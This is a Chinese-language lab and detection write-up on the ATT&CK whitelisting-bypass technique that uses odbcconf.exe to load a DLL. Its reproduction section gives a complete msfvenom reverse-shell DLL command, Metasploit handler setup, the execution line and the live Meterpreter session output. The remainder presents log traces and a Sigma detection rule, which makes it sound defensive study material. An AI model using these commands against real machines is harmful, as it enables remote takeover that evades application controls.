# T1218-008-win-基于白名单Odbcconf.exe执行Payload

## 来自ATT&CK的描述

可信数字证书签署的二进制文件在Windows操作系统执行时，可通过数字签名验证保护。Windows安装过程中默认安装的一些微软签名的二进制文件可用来代理执行其它文件。攻击者可能会滥用此技术来执行可能绕过应用白名单机制和系统签名验证的恶意文件。该技术考虑了现有技术中尚未考虑的代理执行方法。

## 测试案例

Odbcconf.exe是允许配置开放数据库连接（ODBC）驱动和数据源名称的Windows工具。攻击者也可能滥用此工具来执行动态链接库，就像带有REGSVR选项的Regsvr32一样。

odbcconf.exe /S /A {REGSVR "C:\Users\Public\file.dll"}

说明：Odbcconf.exe所在路径已被系统添加PATH环境变量中，因此，Odbcconf命令可识别，需注意x86，x64位的Odbcconf调用。

Windows 2003 默认位置：

```dos
C:\WINDOWS\system32\odbcconf.exe
C:\WINDOWS\SysWOW64\odbcconf.exe
```

Windows 7 默认位置：

```dos
C:\Windows\System32\odbcconf.exe
C:\Windows\SysWOW64\odbcconf.exe
```

补充说明：在高版本操作系统中，可以通过配置策略，对进程命令行参数进行记录。日志策略开启方法：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`，同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。

## 检测日志

windows 安全日志（需要自行配置）

## 测试复现

### 环境准备

攻击机：Kali2019

靶机：windows 7

### 攻击分析

#### 生成payload.dll

```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=53  -f dll -o payload.dll
```

#### 执行监听

攻击机,注意配置set AutoRunScript migrate f (AutoRunScript是msf中一个强大的自动化的后渗透工具，这里migrate参数是迁移木马到其他进程)

```bash
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.126.146
lhost => 192.168.126.146
msf5 exploit(multi/handler) > set lport 53
lport => 53
msf5 exploit(multi/handler) > set AutoRunScript migrate -f
AutoRunScript => migrate -f
msf5 exploit(multi/handler) > exploit
```

#### 靶机执行payload

```cmd
C:\Windows\SysWOW64\odbcconf.exe /a {regsvr C:\payload.dll}
```

#### 反弹shell

```bash
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.126.146:53
[*] Sending stage (180291 bytes) to 192.168.126.149
[*] Meterpreter session 2 opened (192.168.126.146:53 -> 192.168.126.149:49306) at 2020-04-18 20:45:29 +0800
[*] Session ID 2 (192.168.126.146:53 -> 192.168.126.149:49306) processing AutoRunScript 'migrate -f'
[!] Meterpreter scripts are deprecated. Try post/windows/manage/migrate.
[!] Example: run post/windows/manage/migrate OPTION=value [...]
[*] Current server process: rundll32.exe (912)
[*] Spawning notepad.exe process to migrate to
[+] Migrating to 3820
[+] Successfully migrated to process

meterpreter > getuid
Server username: 12306Br0-PC\12306Br0
```

## 测试留痕

```log
windows安全日志
事件ID： 4688
进程信息:
新进程 ID: 0xfec
新进程名: C:\Windows\SysWOW64\odbcconf.exe

事件ID：4688
进程信息:
新进程 ID: 0x390
新进程名: C:\Windows\SysWOW64\rundll32.exe

sysmon日志
事件ID：1
Image: C:\Windows\SysWOW64\odbcconf.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: ODBC Driver Configuration Program
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: odbcconf.exe
CommandLine: C:\Windows\SysWOW64\odbcconf.exe  /a {regsvr C:\payload.dll}
CurrentDirectory: C:\
User: 12306Br0-PC\12306Br0
LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}
LogonId: 0x6e21a
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=B1C49B2159C237B1F2BCE2D40508113E39143F7B
ParentProcessGuid: {bb1f7c32-f65d-5e9a-0000-0010833eef00}
ParentProcessId: 3868
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: "C:\Windows\system32\cmd.exe"

事件ID：1
Image: C:\Windows\SysWOW64\rundll32.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: Windows host process (Rundll32)
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: rundll32.exe
CurrentDirectory: C:\
User: 12306Br0-PC\12306Br0
LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600}
LogonId: 0x6e21a
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=8939CF35447B22DD2C6E6F443446ACC1BF986D58
ParentProcessGuid: {bb1f7c32-f662-5e9a-0000-0010d648ef00}
ParentProcessId: 4076
ParentImage: C:\Windows\SysWOW64\odbcconf.exe
ParentCommandLine: C:\Windows\SysWOW64\odbcconf.exe  /a {regsvr C:\payload.dll}
```

## 检测规则/思路

### sigma规则

```yml
title: Application Whitelisting Bypass via DLL Loaded by odbcconf.exe
description: Detects defence evasion attempt via odbcconf.exe execution to load DLL
status: experimental
references:
    - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Odbcconf.yml
    - https://twitter.com/Hexacorn/status/1187143326673330176
author: Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community
date: 2019/10/25
modified: 2019/11/07
tags:
    - attack.defense_evasion
    - attack.execution
    - attack.t1218
logsource:
    category: process_creation
    product: windows
detection:
    selection_1:
        Image|endswith: '\odbcconf.exe'
        CommandLine|contains:
            - '-f'
            - '/a'
            - 'regsvr'
    selection_2:
        ParentImage|endswith: '\odbcconf.exe'
        Image|endswith: '\rundll32.exe'
    condition: selection_1 or selection_2
level: medium
falsepositives:
    - Legitimate use of odbcconf.exe by legitimate user
```

### 建议

无具体检测规则，可根据进程创建事件4688/1（进程名称、命令行）进行监控。本监控方法需要自行安装配置审核策略Sysmon。

## 参考推荐

MITRE-ATT&CK-T1218-008

<https://attack.mitre.org/techniques/T1218/008/>

windows下基于白名单获取shell的方法整理（下）

<http://www.safe6.cn/article/157#directory030494471069429444>
